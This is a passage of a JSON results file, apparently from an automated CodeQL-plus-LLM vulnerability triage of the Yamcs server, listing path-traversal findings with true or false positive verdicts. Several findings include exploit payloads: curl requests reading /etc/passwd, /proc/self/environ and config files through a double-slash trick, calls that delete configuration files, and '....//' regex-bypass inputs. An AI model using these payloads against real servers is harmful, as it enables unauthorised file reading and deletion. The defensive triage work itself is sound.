+      "code_snippet": "    @Override\n    public byte[] getObject(String objectName) throws IOException {\n        Path path = root.resolve(objectName);\n        if (Files.exists(path)) {\n            return Files.readAllBytes(path);\n        } else {\n            return null;\n        }\n    }\n\n    @Override\n    public void deleteObject(String objectName) throws IOException {\n        Path path = root.resolve(objectName);\n        Files.delete(path);\n    }\n\n    @Override\n    public ObjectProperties findObject(String objectName) throws IOException {\n        Path path = root.resolve(objectName);\n        if (Files.exists(path)) {\n            BasicFileAttributes attrs = Files.readAttributes(path, BasicFileAttributes.class);",
+      "reasoning": "The `putObject` method at lines 146-147 correctly performs a canonicalization-then-check:\n```java\nPath path = root.resolve(objectName);\nif (!path.toFile().getCanonicalPath().startsWith(root.toFile().getCanonicalPath())) {\n    throw new IOException(\"Directory traversal attempted: \" + path);\n}\n```\n\nHowever, `getObject`, `deleteObject`, and `findObject` all use `root.resolve(objectName)` WITHOUT any containment check:\n- `getObject`: `root.resolve(objectName)` \u2192 `Files.readAllBytes(path)` \u2014 arbitrary file read\n- `deleteObject`: `root.resolve(objectName)` \u2192 `Files.delete(path)` \u2014 arbitrary file deletion  \n- `findObject`: `root.resolve(objectName)` \u2192 `Files.readAttributes(path, ...)` \u2014 file metadata access\n\nIf `objectName` contains `../` sequences (e.g., `../../etc/passwd`), these methods would access files outside the bucket root. Since `putObject` has the check but `getObject/deleteObject/findObject` don't, there's an inconsistency - the write path is protected but the read and delete paths are not.\n\nThe containment check in `putObject` uses `getCanonicalPath().startsWith()` (string-based but on canonical paths), which is the correct pattern. The same pattern is absent from the other three methods.",
+      "evidence": {
+        "code_context": "putObject (lines 146-147) - HAS check:\n  Path path = root.resolve(objectName);\n  if (!path.toFile().getCanonicalPath().startsWith(root.toFile().getCanonicalPath())) {\n    throw new IOException(\"Directory traversal attempted: \" + path);\n  }\n\ngetObject (lines 194-199) - NO check:\n  Path path = root.resolve(objectName);\n  if (Files.exists(path)) { return Files.readAllBytes(path); }\n\ndeleteObject (lines 203-206) - NO check:\n  Path path = root.resolve(objectName);\n  Files.delete(path);\n\nfindObject (lines 209-215) - NO check:\n  Path path = root.resolve(objectName);\n  if (Files.exists(path)) { ... attrs ... }",
+        "notes": "Inconsistent protection: putObject has traversal check but getObject/deleteObject/findObject don't. If objectName is user-supplied (e.g., via CFDP file transfer or REST API), this allows arbitrary file read/delete."
+      },
+      "dataflow_path": null,
+      "exploit_payload": {
+        "code_snippet": "// Via REST API or CFDP file transfer, request getObject with traversal path:\n// GET /api/buckets/mybucket/objects/..%2F..%2F..%2Fetc%2Fpasswd\n// Or if bucket object names flow directly:\nBucket bucket = new FileSystemBucket(\"mybucket\", Paths.get(\"/yamcs-data/buckets/mybucket\"));\nbyte[] data = bucket.getObject(\"../../etc/passwd\");  // reads /yamcs-data/etc/passwd or /etc/passwd\nbyte[] data2 = bucket.getObject(\"../otherbucket/secretfile\");  // cross-bucket read\n\n// Delete arbitrary files:\nbucket.deleteObject(\"../../config/yamcs.yaml\");  // deletes Yamcs configuration",
+        "scenario": "Attacker with access to the Yamcs REST API sends a bucket object name containing ../ traversal sequences to getObject or deleteObject, reading arbitrary files or deleting files outside the bucket root",
+        "likelihood": "medium",
+        "impact": "high",
+        "exploitability": "easy",
+        "prerequisites": "API access to Yamcs bucket operations (getObject, deleteObject, findObject); authentication may be required depending on instance configuration",
+        "category": "Path traversal - arbitrary file read and delete"
+      },
+      "group": "high_undetermined_undetermined",
+      "sanity_check": {
+        "verdict": "tp",
+        "confidence": 92,
+        "recommendation": "accept",
+        "concerns": false,
+        "flags": [
+          {
+            "type": "ZERO_DAY",
+            "severity": "critical",
+            "message": "Inconsistent path traversal protection: putObject has a canonicalization check but getObject, deleteObject, and findObject do not",
+            "evidence": "Code clearly shows putObject performs canonical path check but getObject (line 193), deleteObject (line 203), and findObject (line 209) all call root.resolve(objectName) without any containment validation, allowing ../../../etc/passwd style traversal"
+          }
+        ],
+        "reasoning": "The vulnerability is confirmed by direct code evidence: putObject correctly validates that the resolved path starts with the canonical root path, but getObject, deleteObject, and findObject all resolve user-supplied objectName without any such check. This is a real path traversal vulnerability (CWE-022) in a backend server component where objectName is externally supplied via REST API or CFDP file transfers. An attacker could read, delete, or enumerate arbitrary files accessible to the process by supplying paths like '../../etc/passwd'."
+      }
+    },
+    {
+      "codeql_query_uuids": [
+        "20260326130948",
+        "20260326131116"
+      ],
+      "finding_id": "4211b873-0aa3-4099-a4bf-666b94ee7a4c",
+      "verdict": "tp",
+      "confidence": 70,
+      "severity": "medium",
+      "cwe_ids": [
+        "cwe-022",
+        "cwe-023"
+      ],
+      "description": "FileSaveHandler.parseObjectName sanitization can be bypassed when allowRemoteProvidedSubdirectory=true - the regex replaceAll(\"[.]{2,}[/\\\\\\\\]\", \"\") that removes directory traversal sequences can be bypassed with patterns like \"..././\" or \"....//\", leaving residual traversal sequences after cleanup",
+      "file_path": "yamcs-core/src/main/java/org/yamcs/filetransfer/FileSaveHandler.java",
+      "start_line": 85,
+      "end_line": 95,
+      "start_column": null,
+      "end_column": null,
+      "code_snippet": "        if(!allowRemoteProvidedSubdirectory) {\n            name = name.replaceAll(\"[/\\\\\\\\]\", \"_\");\n        } else {\n            // Removing leading slashes, spaces and dots (permitting \".filename\")\n            name = name.replaceAll(\"^(?![.]\\\\w)[./\\\\\\\\ ]+\", \"\");\n            // Removing directory traversal characters\n            name = name.replaceAll(\"[.]{2,}[/\\\\\\\\]\", \"\");\n        }\n\n        name = name.strip();",
+      "reasoning": "When `allowRemoteProvidedSubdirectory=true`, the sanitization uses two regex replacements:\n1. `replaceAll(\"^(?![.]\\\\w)[./\\\\\\\\ ]+\", \"\")` - removes leading slashes/dots/spaces\n2. `replaceAll(\"[.]{2,}[/\\\\\\\\]\", \"\")` - removes `../` and `..\\` traversal sequences\n\nThis can be bypassed because the second regex only does a single non-overlapping pass:\n- Input: `....//` \u2192 regex matches `....` + `/` \u2192 removed \u2192 leaves `/`\n- Input: `..././` \u2192 The regex `[.]{2,}` needs 2+ dots. `...` (3 dots) + `/` \u2192 removed \u2192 leaves `./` \u2192 traversal!\n- Input: `.../.` \u2192 regex matches `...` + `/` \u2192 removed \u2192 leaves `.` \u2192 not traversal but still tricky\n- More critically: `....//` \u2192 first match is `....` (4 dots) + `/` (one char from `[/\\\\]`) \u2192 removes `..../ ` \u2192 leaves `/` \u2192 then the path has a leading slash that could go to absolute\n\nActually the most reliable bypass: if the name is `....//` the regex `[.]{2,}[/\\\\]` is applied once to the whole string. The regex engine finds `....` (first 4 chars) and `/` (5th char), removes them, leaving `/`. The result `/` is then stripped by `name.strip()` but strip() only removes whitespace. So the name becomes `/` which, when passed to `root.resolve(\"/\")`, would resolve to the filesystem root `/`.\n\nHowever, `putObject` in `FileSystemBucket` does have the canonical path containment check, so this specific path would be caught there. But `getObject`, `deleteObject` and `findObject` do NOT have the check (as found above), so if an objectName with traversal is stored or if the derived name is used elsewhere without the `putObject` check, traversal is possible.\n\nThe key risk: the `objectName` field is set and then used in `bucket.putObject()` which has a check. But the `objectName` field is publicly accessible via `getObjectName()` and could be used by other callers without the putObject protection.",
+      "evidence": {
+        "code_context": "parseObjectName sanitization (lines 85-94):\n  if(!allowRemoteProvidedSubdirectory) {\n    name = name.replaceAll(\"[/\\\\\\\\]\", \"_\");  // safe path\n  } else {\n    name = name.replaceAll(\"^(?![.]\\\\w)[./\\\\\\\\ ]+\", \"\");  // strip leading\n    name = name.replaceAll(\"[.]{2,}[/\\\\\\\\]\", \"\");  // strip ../\n  }\n\nBypass: '....//etc/passwd'\n  Step 1 (leading): no leading match\n  Step 2 (traversal): matches '....' + '/' -> removes -> leaves '/etc/passwd'\n  Result: '/etc/passwd' -> passed to bucket.putObject('/etc/passwd')\n  putObject has check -> caught there\n  But getObject('/etc/passwd') has NO check -> arbitrary read",
+        "notes": "The sanitization is bypassable with '....//'. Even when putObject's check catches it at write time, the object name derived by parseObjectName is used in multiple places. The deeper issue is the inconsistency between putObject protection and getObject/deleteObject/findObject having no protection."
+      },
+      "dataflow_path": null,
+      "exploit_payload": {
+        "code_snippet": "// CFDP file transfer with destination filename '....//etc/passwd':\n// When allowRemoteProvidedSubdirectory=true:\n// Step 1: replaceAll(\"^(?![.]\\\\w)[./\\\\\\\\ ]+\", \"\") -> no leading match on '....//etc/passwd'\n// Step 2: replaceAll(\"[.]{2,}[/\\\\\\\\]\", \"\") -> matches '....' + '/' -> removes -> '/etc/passwd'\n// Result objectName = '/etc/passwd'\n// This is passed to bucket.putObject('/etc/passwd') which HAS a check\n// But bucket.getObject('/etc/passwd') has NO check -> reads /etc/passwd\n\n// Alternative - nested traversal that survives single-pass regex:\n// Input: '....//secret' -> after regex -> '/secret' (treated as absolute)\n// Input: '..\\\\..\\\\etc\\\\passwd' on Windows -> regex removes '..\\\\'  -> '../etc/passwd'?\n// Let's test: '..\\\\..\\\\' -> regex '[.]{2,}[/\\\\\\\\]' matches '..\\\\'  -> removes '..\\\\'  -> leaves '..\\\\'  (second match) -> removes -> '' + 'etc\\\\passwd' -> 'etc\\\\passwd' (safe actually)\n// But '....\\\\\\\\etc' -> matches '....' + '\\\\' -> removes -> '\\\\etc' (absolute UNC-like)",
+        "scenario": "Attacker sends CFDP file transfer with destination filename containing '....//etc/passwd' which bypasses the single-pass regex traversal cleanup in parseObjectName, resulting in a sanitized name that resolves outside the bucket root",
+        "likelihood": "low",
+        "impact": "medium",
+        "exploitability": "medium",
+        "prerequisites": "allowRemoteProvidedSubdirectory must be set to true in CFDP configuration; CFDP file transfer endpoint must be accessible",
+        "category": "Path traversal via incomplete sanitization bypass"
+      },
+      "group": "high_undetermined_undetermined",
+      "sanity_check": {
+        "verdict": "tp",
+        "confidence": 75,
+        "recommendation": "accept",
+        "concerns": true,
+        "flags": [
+          {
+            "type": "NOVEL_FINDING",
+            "severity": "warning",
+            "message": "Regex-based sanitization bypass via overlapping patterns",
+            "evidence": "The regex '[.]{2,}[/\\\\]' only does a single pass. Input '....//etc/passwd': matches '....' + first '/' \u2192 removes \u2192 leaves '/etc/passwd'. This is a real bypass technique for single-pass regex sanitization."
+          },
+          {
+            "type": "EXPLOITABILITY",
+            "severity": "warning",
+            "message": "Exploitability partially mitigated by putObject checks, but getObject/findObject/deleteObject may lack equivalent checks",
+            "evidence": "The finding notes that putObject has its own check but getObject has none. Since parseObjectName returns the name used in bucket.findObject(name) at line 104, and potentially in downstream operations, the bypass could enable path traversal on read/delete operations even if writes are caught."
+          }
+        ],
+        "reasoning": "The code does contain the claimed vulnerability: the single-pass regex replacement of '[.]{2,}[/\\\\]' can be bypassed with inputs like '....//'. For example, '....//etc/passwd' - the regex matches '....' and the first '/' leaving '/etc/passwd'. The code is production backend code handling file transfers, making this reachable from remote input when allowRemoteProvidedSubdirectory=true. The partial mitigation at putObject is noted but inconsistent protection across bucket operations (findObject, getObject, deleteObject) creates a real attack surface for path traversal."
+      }
+    },
+    {
+      "codeql_query_uuids": [
+        "20260326132320"
+      ],
+      "finding_id": "156e8b55-1859-4680-aa01-1c5c0ccc3e7f",
+      "verdict": "fp",
+      "confidence": 85,
+      "severity": "low",
+      "cwe_ids": [
+        "cwe-022"
+      ],
+      "description": "AngularHandler.handle() calls locateFile() for existence check only - actual file serving goes through super.handle() which invokes sanitizePath - not a direct bypass",
+      "file_path": "yamcs-web/src/main/java/org/yamcs/web/AngularHandler.java",
+      "start_line": 96,
+      "end_line": 99,
+      "start_column": null,
+      "end_column": null,
+      "code_snippet": "        // Try to serve a static file\n        var file = locateFile(filePath);\n        if (file != null && !filePath.isEmpty()) {\n            super.handle(ctx);",
+      "reasoning": "In AngularHandler.handle(), `locateFile(filePath)` is called to check if a static file exists. If the file exists, the handler calls `super.handle(ctx)` which routes to StaticFileHandler's `handle()` method, which calls `handleStaticFileRequest()`, which calls `sanitizePath()` before using the path. The actual file is only served after going through sanitizePath. The `locateFile()` call here is only for routing logic (to decide whether to serve a static file or fall through to Angular SPA routing), not for actual file serving. The file object returned by `locateFile()` at line 96 is not used for serving - `super.handle(ctx)` re-derives and re-validates the path. Therefore the AngularHandler path doesn't bypass sanitizePath for actual file serving. Note: the sanitizePath issues in StaticFileHandler still apply, but those are captured in the separate StaticFileHandler finding.",
+      "evidence": {
+        "code_context": "AngularHandler.handle():\n  var filePath = getFilePath(ctx);  // line 72\n  ...\n  var file = locateFile(filePath);  // line 96 - existence check only\n  if (file != null && !filePath.isEmpty()) {\n    super.handle(ctx);  // line 98 - calls StaticFileHandler.handle() -> handleStaticFileRequest() -> sanitizePath()\n    return;\n  }\n  // Falls through to serve index.html for SPA routing",
+        "notes": "The locateFile call at line 96 is for routing decisions only. The returned file object is not used for serving content. super.handle() re-invokes the full sanitizePath flow."
+      },
+      "dataflow_path": null,
+      "exploit_payload": null,
+      "group": "high_undetermined_undetermined",
+      "sanity_check": {
+        "verdict": "fp",
+        "confidence": 90,
+        "recommendation": "reject",
+        "concerns": false,
+        "flags": [
+          {
+            "type": "EXPLOITABILITY",
+            "severity": "info",
+            "message": "The locateFile() call is used only for routing decisions, not for serving file content",
+            "evidence": "The file object returned by locateFile() is never used to serve content. super.handle(ctx) re-invokes the full StaticFileHandler pipeline which calls sanitizePath() before serving any file."
+          },
+          {
+            "type": "CODE_SMELL",
+            "severity": "info",
+            "message": "Pattern of using locateFile for existence check before delegating to parent is a routing decision, not a path traversal bypass",
+            "evidence": "The code at line 96-99 shows `var file = locateFile(filePath)` followed by `super.handle(ctx)` - the file variable result is discarded and the actual serving goes through the sanitized super.handle() path."
+          }
+        ],
+        "reasoning": "The finding is a false positive. The `locateFile()` call at line 96 is purely used for a routing decision (to determine if a static file exists), and the actual file serving occurs through `super.handle(ctx)` which invokes the full StaticFileHandler pipeline including `sanitizePath()`. The file object returned by `locateFile()` is never directly used to read or serve file content, so there is no path traversal bypass. The analysis in the finding's own reasoning correctly identifies this as a non-vulnerability."
+      }
+    },
+    {
+      "codeql_query_uuids": [
+        "20260326130927"
+      ],
+      "finding_id": "1560d47d-315b-451f-94a9-d1d5cd2231fe",
+      "verdict": "fp",
+      "confidence": 90,
+      "severity": "low",
+      "cwe_ids": [
+        "cwe-022"
+      ],
+      "description": "FileSystemBucket.putObject has proper canonicalization-then-check protection against path traversal - this is a sound implementation",
+      "file_path": "yamcs-core/src/main/java/org/yamcs/yarch/FileSystemBucket.java",
+      "start_line": 146,
+      "end_line": 149,
+      "start_column": null,
+      "end_column": null,
+      "code_snippet": "        // Prevent directory traversal\n        Path path = root.resolve(objectName);\n        if (!path.toFile().getCanonicalPath().startsWith(root.toFile().getCanonicalPath())) {\n            throw new IOException(\"Directory traversal attempted: \" + path);\n        }",
+      "reasoning": "The putObject method uses the correct canonicalize-then-check pattern: `getCanonicalPath()` is called on both the resolved path AND the root before comparing with `startsWith()`. This correctly resolves all `..` sequences and symlinks before comparison, making the check sound. While there's a minor risk of prefix collision if the root path doesn't end with a separator (e.g., `/buckets/myb` would match `/buckets/mybucket`), the `getCanonicalPath()` call normalizes this. The implementation is functionally correct for path traversal prevention in putObject. The missing checks in getObject/deleteObject/findObject are flagged separately.",
+      "evidence": {
+        "code_context": "FileSystemBucket.putObject lines 146-149:\n  Path path = root.resolve(objectName);\n  if (!path.toFile().getCanonicalPath().startsWith(root.toFile().getCanonicalPath())) {\n    throw new IOException(\"Directory traversal attempted: \" + path);\n  }\nThis is the canonicalize-then-check pattern - SOUND implementation.",
+        "notes": "getCanonicalPath() resolves all ../ sequences and symlinks before the startsWith comparison. However, note the potential prefix collision if root canonical path doesn't end with separator. But this is putObject specifically - the missing checks are in getObject/deleteObject/findObject."
+      },
+      "dataflow_path": null,
+      "exploit_payload": null,
+      "group": "high_undetermined_undetermined",
+      "sanity_check": {
+        "verdict": "fp",
+        "confidence": 85,
+        "recommendation": "reject",
+        "concerns": true,
+        "flags": [
+          {
+            "type": "CODE_SMELL",
+            "severity": "warning",
+            "message": "Potential prefix collision vulnerability in startsWith check without separator",
+            "evidence": "The startsWith() comparison without ensuring root canonical path ends with '/' could allow '/buckets/myb' to match '/buckets/mybucket'. However, this is noted in the reasoning but dismissed. The actual risk depends on how bucket roots are configured."
+          },
+          {
+            "type": "NOVEL_FINDING",
+            "severity": "info",
+            "message": "The finding notes that getObject/deleteObject/findObject lack similar path traversal protection",
+            "evidence": "Evidence notes: 'the missing checks are in getObject/deleteObject/findObject' - this suggests the real vulnerability may exist in OTHER methods not covered by this finding, making this finding about putObject correctly classified as FP"
+          }
+        ],
+        "reasoning": "The putObject method does implement the correct canonicalize-then-check pattern using getCanonicalPath() on both the resolved path and root before the startsWith comparison, which properly resolves '../' sequences and symlinks. The finding is correctly classified as a false positive for putObject specifically. The minor prefix collision concern (missing trailing separator in startsWith) is a theoretical issue but not a clear exploitable vulnerability in this context. The more significant concern mentioned in the evidence - that other methods like getObject/deleteObject/findObject may lack similar protections - would be a separate finding not covered here."
+      }
+    },
+    {
+      "codeql_query_uuids": [
+        "20260326130909",
+        "20260326131958",
+        "20260326132144",
+        "20260326132254",
+        "20260326132320"
+      ],
+      "finding_id": "6748b386-601f-44ac-8f34-929177781b37",
+      "verdict": "tp",
+      "confidence": 85,
+      "severity": "high",
+      "cwe_ids": [
+        "cwe-022",
+        "cwe-036"
+      ],
+      "description": "StaticFileHandler.locateFile uses Path.resolve() without verifying the resolved path stays within staticRoot - an absolute path input (e.g. /etc/passwd) bypasses sanitizePath and causes Path.resolve() to return the absolute path directly, escaping the static root entirely",
+      "file_path": "yamcs-core/src/main/java/org/yamcs/http/StaticFileHandler.java",
+      "start_line": 98,
+      "end_line": 106,
+      "start_column": null,
+      "end_column": null,
+      "code_snippet": "    protected File locateFile(String path) {\n        for (var staticRoot : staticRoots) { // Stop on first match\n            var file = staticRoot.resolve(path).toFile();\n            if (!file.isHidden() && file.exists()) {\n                return file;\n            }\n        }\n        return null;\n    }",
+      "reasoning": "Java's `Path.resolve(String other)` documentation states: \"If the other parameter is an absolute path then this method trivially returns other.\" This means if `path` is an absolute path string (e.g., `/etc/passwd`), `staticRoot.resolve(\"/etc/passwd\")` ignores `staticRoot` entirely and returns `Path(\"/etc/passwd\")`.\n\nThe `sanitizePath` method checks:\n1. Contains `File.separator + \".\"` (i.e., `/.`)\n2. Contains `\".\" + File.separator` (i.e., `./`)\n3. Starts with `.`\n4. Ends with `.`\n\nNone of these checks block an absolute path like `/etc/passwd`. The path `/etc/passwd` contains no dots (relative to separator), doesn't start or end with `.`.\n\nAttack scenario:\n1. Request comes in: `GET /static//etc/passwd HTTP/1.1`\n2. `getFilePath()` strips the route prefix `/static` and leading `/`, returning the path from the URI after the route\n3. Looking at line 96: `uri.substring(route.length() + 1)` - if uri is `/static//etc/passwd` and route is `/static`, this returns `/etc/passwd` (an absolute path)\n4. `sanitizePath(\"/etc/passwd\")` - no dots, no separator+dot patterns \u2192 returns `/etc/passwd`\n5. `locateFile(\"/etc/passwd\")` - `staticRoot.resolve(\"/etc/passwd\")` \u2192 returns `/etc/passwd` directly\n6. `file.exists()` \u2192 true \u2192 file is served\n\nThe `getFilePath` typically strips the leading `/` in the path after the route. Let me verify - `uri.substring(route.length() + 1)` where route is e.g. `/static`: if uri = `/static/foo.js`, result is `foo.js`. If uri = `/static//etc/passwd`, result is `/etc/passwd` (absolute). The double slash creates the absolute path escape.\n\nThis is a distinct and more reliable vulnerability than the URL-encoding bypass in sanitizePath.",
+      "evidence": {
+        "code_context": "getFilePath (lines 92-96):\n  protected String getFilePath(HandlerContext ctx) {\n    var uri = ctx.getPathWithoutContext();  // e.g. '/static//etc/passwd'\n    return uri.substring(route.length() + 1);  // strips '/static' + 1 char = '/etc/passwd'\n  }\n\nsanitizePath('/etc/passwd'):\n  path.replace('/', File.separatorChar) -> '/etc/passwd'\n  contains('/.'): false\n  contains('./'): false  \n  startsWith('.'): false\n  endsWith('.'): false\n  -> returns '/etc/passwd' (PASSES check)\n\nlocateFile('/etc/passwd'):\n  staticRoot.resolve('/etc/passwd')  // Java Path.resolve() with absolute path -> returns '/etc/passwd'\n  file.exists() -> true -> returns file\n  -> ARBITRARY FILE READ",
+        "dataflow_analysis": "HTTP GET /static//etc/passwd -> uri='/static//etc/passwd' -> getPathWithoutContext() strips query string -> getFilePath() strips route prefix '/static'+1 char -> rawPath='/etc/passwd' -> sanitizePath('/etc/passwd') passes (no dots) -> locateFile('/etc/passwd') -> Path.resolve('/etc/passwd') returns /etc/passwd -> file served",
+        "notes": "Java Path.resolve() with absolute string argument bypasses the base path. sanitizePath only checks for dot sequences, not absolute paths. The double-slash in the URI creates the absolute path escape after route prefix stripping."
+      },
+      "dataflow_path": null,
+      "exploit_payload": {
+        "code_snippet": "# If static route is '/static', double-slash creates absolute path after prefix strip:\ncurl 'http://yamcs-server:8090/static//etc/passwd'\n# getFilePath: uri='/static//etc/passwd', route='/static'\n# uri.substring('/static'.length() + 1) = uri.substring(8) = '/etc/passwd'\n# sanitizePath('/etc/passwd') -> passes (no dots)\n# locateFile('/etc/passwd') -> staticRoot.resolve('/etc/passwd') -> /etc/passwd\n# File.exists() -> true -> file served\n\n# For other static routes (e.g. '/yamcs-web'):\ncurl 'http://yamcs-server:8090/yamcs-web//etc/passwd'\ncurl 'http://yamcs-server:8090/yamcs-web//proc/self/environ'\ncurl 'http://yamcs-server:8090/yamcs-web//opt/yamcs/etc/yamcs.yaml'",
+        "scenario": "Attacker sends HTTP GET request with double-slash after static route (e.g. /static//etc/passwd) which causes getFilePath to return an absolute path that bypasses sanitizePath dot-checks and causes Path.resolve() to ignore the static root entirely",
+        "likelihood": "medium",
+        "impact": "high",
+        "exploitability": "easy",
+        "prerequisites": "Network access to Yamcs HTTP server; static file serving enabled (default for web UI)",
+        "category": "Absolute path traversal - arbitrary file read"
+      },
+      "group": "high_undetermined_undetermined",
+      "sanity_check": {
+        "verdict": "tp",
+        "confidence": 88,
+        "recommendation": "accept",
+        "concerns": false,
+        "flags": [
+          {
+            "type": "ZERO_DAY",
+            "severity": "critical",
+            "message": "Path traversal via absolute path injection in StaticFileHandler",
+            "evidence": "Java's Path.resolve() with an absolute path argument ignores the base path entirely. sanitizePath() only checks for dot sequences but not absolute paths. A request like GET /static//etc/passwd results in rawPath='/etc/passwd' which passes sanitizePath and then Path.resolve('/etc/passwd') returns /etc/passwd directly, bypassing staticRoot."
+          }
+        ],
+        "reasoning": "The vulnerability is real and well-documented. The code trace is accurate: getFilePath strips the route prefix leaving '/etc/passwd' (or similar absolute paths), sanitizePath only checks for dot-based traversal sequences and passes absolute paths, and Java's Path.resolve() with an absolute argument ignores the base path entirely. This is a classic path traversal vulnerability (CWE-022) leading to arbitrary file read from the server. The double-slash URI trick (/static//etc/passwd) is a concrete exploitation vector that produces an absolute path after prefix stripping. This is production server code handling HTTP requests, making it directly exploitable."
+      }
+    },
+    {
+      "codeql_query_uuids": [
+        "20260326130927"
+      ],
+      "finding_id": "e4b73ccd-b9ee-466d-981b-5eb564c63c91",
+      "verdict": "fp",
+      "confidence": 90,
+      "severity": "low",
+      "cwe_ids": [
+        "cwe-022"
+      ],
+      "description": "FileSystemBucket path operations at lines 84-85 (AtomicLong/AtomicInteger .get() calls) are not path traversal - these are counter operations in getProperties()",
+      "file_path": "yamcs-core/src/main/java/org/yamcs/yarch/FileSystemBucket.java",
+      "start_line": 84,
+      "end_line": 85,
+      "start_column": null,
+      "end_column": null,
+      "code_snippet": "                size.addAndGet(attrs.size());\n                objectCount.incrementAndGet();",
+      "reasoning": "The query flagged AtomicLong.get() and AtomicInteger.get() calls at lines 84-85 as \"path operations\". Looking at the actual code, these are counter operations inside a FileVisitor callback in the getProperties() method - they accumulate file size and object count statistics. There are no path traversal issues here - the walkFileTree is rooted at `root` and the AtomicLong/AtomicInteger are just counters. The CodeQL query appears to have been too broad in what it considers \"path operations\".",
+      "evidence": {
+        "code_context": "FileSystemBucket.getProperties() around lines 80-90:\n  Files.walkFileTree(root, opts, Integer.MAX_VALUE, new SimpleFileVisitor<Path>() {\n    public FileVisitResult visitFile(Path file, BasicFileAttributes attrs) throws IOException {\n      size.addAndGet(attrs.size());   // line 84 - counter, not path op\n      objectCount.incrementAndGet(); // line 85 - counter, not path op\n      return FileVisitResult.CONTINUE;\n    }\n  });\nThese are AtomicLong/AtomicInteger counter operations, not file path operations.",
+        "notes": "False positive - query was too broad in identifying 'path operations'"
+      },
+      "dataflow_path": null,
+      "exploit_payload": null,
+      "group": "high_undetermined_undetermined",
+      "sanity_check": {
+        "verdict": "fp",
+        "confidence": 97,
+        "recommendation": "reject",
+        "concerns": false,
+        "flags": [
+          {
+            "type": "HALLUCINATION",
+            "severity": "critical",
+            "message": "The flagged lines are not path operations - they are AtomicLong/AtomicInteger counter operations",
+            "evidence": "Lines 84-85 contain 'size.addAndGet(attrs.size())' and 'objectCount.incrementAndGet()' which are numeric counter updates, not file path operations. The static analysis tool incorrectly identified these as path traversal related operations."
+          },
+          {
+            "type": "CODE_SMELL",
+            "severity": "info",
+            "message": "The walkFileTree uses FOLLOW_LINKS which could theoretically follow symlinks outside the root directory, but this is a separate consideration from the flagged lines",
+            "evidence": "FileVisitOption.FOLLOW_LINKS is used, but the flagged lines (84-85) are purely counter operations with no path traversal risk."
+          }
+        ],
+        "reasoning": "The finding is a clear false positive. The flagged code at lines 84-85 consists of AtomicLong.addAndGet() and AtomicInteger.incrementAndGet() calls that accumulate file size and object count statistics - these have absolutely no relation to path traversal vulnerabilities. The static analysis tool appears to have been overly broad in classifying operations within a FileVisitor callback as 'path operations'. There is no CWE-022 (Path Traversal) vulnerability at these specific lines."
+      }
+    }
+  ],
+  "sanity_check_metadata": {
+    "session_id": "20260326133449",
+    "model": "claude-sonnet-4-6",
+    "temperature": 1.0,
+    "max_tokens": 25000,
+    "total_input_tokens": 20791,
+    "total_output_tokens": 4392,
+    "total_tokens": 25183,
+    "estimated_cost_usd": 0.1283,
+    "total_findings_validated": 13,
+    "findings_with_flags": 0,
+    "elapsed_time_seconds": 95.0
+  }
+}
